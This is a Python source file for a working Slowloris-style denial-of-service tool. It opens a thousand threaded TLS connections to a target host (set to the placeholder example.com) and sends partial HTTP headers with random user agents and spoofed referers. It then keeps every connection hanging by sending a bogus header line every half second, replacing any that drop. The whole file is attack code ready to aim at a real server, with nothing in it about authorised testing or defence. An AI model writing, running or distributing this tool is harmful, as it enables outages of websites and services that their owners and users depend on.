# Libraries
import os
import ssl
import time
import random
import socket
from concurrent.futures import ThreadPoolExecutor

# Constants
CONNECTIONS_AMOUNT = 1000
MAX_THREADS_AMOUNT = os.cpu_count() + 4
TARGET_ADDRESS = "example.com"
TARGET_PORT = 443
WAIT_TIME = 0.5
TIMEOUT = 15
ENCODING_FORMAT = "utf-8"

USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

REFERERS = [
    "http://validator.w3.org/check?uri=",
    "http://www.facebook.com/sharer/sharer.php?u=",
]

# Global variables
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE


# Function to create a socket
def create_socket(
    host,
    port,
    timeout=3,
    user_agent="Mozilla/5.0",
    referer="http://example.re",
    encoding_format="utf-8",
):
    # Create the socket
    http_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    http_socket.settimeout(timeout)

    # Wrap the socket in SSL if the connection is HTTPS
    if port == 443:
        http_socket = ssl_context.wrap_socket(http_socket, server_hostname=host)

    # Connect the socket
    http_socket.connect((host, port))

    # Create the header
    request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
    user_agent = f"User-Agent: {user_agent}\r\n"
    language = "Accept-Language: en-US,en;q=0.9\r\n"
    referer = f"Referer: {referer}\r\n"
    header = request + language + user_agent + referer

    # Send the header data
    http_socket.send(header.encode(encoding_format))

    # Return the socket
    return http_socket


# Function to create a set of sockets
def create_socket_set(socket_amount):
    # Function to create a socket and handle exceptions
    def create_one_socket(param):
        try:
            http_socket = create_socket(
                host=TARGET_ADDRESS,
                port=TARGET_PORT,
                timeout=TIMEOUT,
                user_agent=random.choice(USER_AGENTS),
                referer=random.choice(REFERERS),
                encoding_format=ENCODING_FORMAT,
            )
            return http_socket
        except socket.error:
            return None

    # Create sockets in parallel
    with ThreadPoolExecutor(max_workers=MAX_THREADS_AMOUNT) as executor:
        created_sockets = executor.map(create_one_socket, range(socket_amount))

    # Return successful sockets
    return list(filter(None, created_sockets))


# Main function
if __name__ == "__main__":
    # Variables
    socket_set = []

    # Function to send data through a socket
    def send_data(http_socket):
        try:
            data = f"X-a: {random.randint(1, 5000)}\r\n"
            http_socket.send(data.encode(ENCODING_FORMAT))
        except socket.error:
            socket_set.remove(http_socket)

    # Create a set of sockets
    print(f"Creating {CONNECTIONS_AMOUNT} connections...\n")
    socket_set += create_socket_set(CONNECTIONS_AMOUNT)

    # Maintain the connection
    print("Ensuring each connection stays alive...")
    try:
        while True:
            # Try to send data through each socket
            print("Sending data through each socket...")
            with ThreadPoolExecutor(max_workers=MAX_THREADS_AMOUNT) as executor:
                executor.map(send_data, socket_set)

            # Create sockets if some have been closed
            required_amount = CONNECTIONS_AMOUNT - len(socket_set)
            if required_amount > 0:
                print(
                    "Some sockets were lost.\n",
                    f"-> Creating {required_amount} sockets...",
                )
                socket_set += create_socket_set(required_amount)

            # Wait for a while
            print(f"Waiting {WAIT_TIME} seconds before continuing...\n")
            time.sleep(WAIT_TIME)
    except KeyboardInterrupt:
        print("Stopping the connection...")
    except Exception as error:
        print(f"There was an error maintaining the connection: {error}")
